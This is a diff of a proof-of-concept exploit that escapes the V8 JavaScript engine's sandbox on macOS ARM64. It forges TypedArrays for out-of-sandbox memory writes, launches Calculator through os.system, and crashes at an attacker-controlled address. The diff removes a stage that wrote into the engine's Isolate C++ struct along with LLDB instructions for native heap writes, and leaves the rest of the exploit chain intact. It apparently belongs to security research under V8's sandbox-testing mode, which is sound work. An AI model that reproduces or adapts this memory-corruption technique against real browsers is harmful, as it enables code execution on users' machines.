@@ -1,4 +1,4 @@
-// V8 Sandbox Escape → Calculator + Native Heap Write + Crash PoC (macOS ARM64)
+// V8 Sandbox Escape → Calculator + Crash PoC (macOS ARM64)
 //
 // Flags: --sandbox-testing --enable-os-system --expose-gc
 //
@@ -7,16 +7,9 @@
 //   (lldb) breakpoint set -n "v8::internal::SandboxTesting::Enable"
 //   (lldb) run → thread return → continue
 //
-// === Stage 7: Native Heap Write ===
-// After first run, fill these from LLDB:
-//   CAGE_BASE_ABS : p/x (unsigned long long)v8::internal::Isolate::Current() & ~0xffffffffULL
-//   NATIVE_TARGET : any writable C++ addr in (CAGE_BASE_ABS, CAGE_BASE_ABS+1TiB)
-//                   e.g. p/x (unsigned long long)&v8::g_platform_
-//                        p/x (unsigned long long)malloc(64)
-// Reachable native heap range = [CAGE_BASE_ABS+1, CAGE_BASE_ABS+0xFFFFFFFFFF]
-
-const CAGE_BASE_ABS = 0x17c000000000n;  // from crash: 0x17c041414148 − 0x41414148
-const NATIVE_TARGET = 0x13c00214bf0n;   // from LLDB: malloc(64)
+// Note: on macOS ARM64, malloc zone (~1 TB) is ~17 TB below the V8 sandbox
+// (~18 TB). The Isolate C++ object is likewise below cage_base. The 1 TiB
+// TypedArray reach extends only UPWARD from cage_base into uncommitted VAS.
 
 // ─────────────────────────────────────────────────────────────
 const kPageSize = 0x40000;
@@ -151,33 +144,11 @@ function main() {
   print(`      WriteSandboxedPointerField CHECK bypassed entirely`);
   print(``);
 
-  // Stage 7: Isolate struct write (V8's core C++ object, at cage_base+0x500000)
-  // macOS ARM64: malloc zone (~1 TB) is 25 TB below sandbox (~27 TB); unreachable.
-  // The Isolate is a C++ object allocated within the sandbox VAS but NOT a GC'd JS object.
-  // Offset_from_cage = 0x500000 → within TypedArray forging reach.
-  const kIsolateOffset = 0x500000n;
-  const isolate_sandbox_offset = cage_base_offset + kIsolateOffset;
-  const [iDv0, iO0] = getDv(isolate_sandbox_offset + 0x200n);  // safe field (stats area)
-  const before_iso = iDv0.getBigUint64(iO0, true);
-
-  // forge ta → cage_base + 0x500200 (isolate + 0x200, past sensitive fields)
-  forgeTypedArray(cur, kIsolateOffset + 0x200n);
-  ta.fill(0x42);
-
-  const [iDv1, iO1] = getDv(isolate_sandbox_offset + 0x200n);
-  const after_iso = iDv1.getBigUint64(iO1, true);
-  print(`[!!!] ISOLATE C++ WRITE`);
-  print(`      cage_base+0x${(kIsolateOffset+0x200n).toString(16)} (V8 Isolate struct+0x200)`);
-  print(`      0x${before_iso.toString(16)} → 0x${after_iso.toString(16)}`);
-  print(`      verify: memory read -s8 -fu -c8 (cage_base_abs + 0x500200)`);
-  print(`      e.g.:   memory read -s8 -fu -c8 0x<cage_base_abs + 0x500200>`);
-  print(``)
-
-  // Stage 8: Calculator
+  // Stage 7: Calculator
   os.system("/usr/bin/open", ["/System/Applications/Calculator.app"]);
   print(`[+] Calculator launched`);
 
-  // Stage 9: Crash PoC — corrupt ta map → EXC_BAD_ACCESS at attacker-controlled address
+  // Stage 8: Crash PoC — corrupt ta map → EXC_BAD_ACCESS at attacker-controlled address
   writeU64(cage_base_offset + 0x100n, 0x4141414141414141n);
   print(`[CRASH] ta map → 0x4141414141414141`);
   print(`[CRASH] triggering access...`);
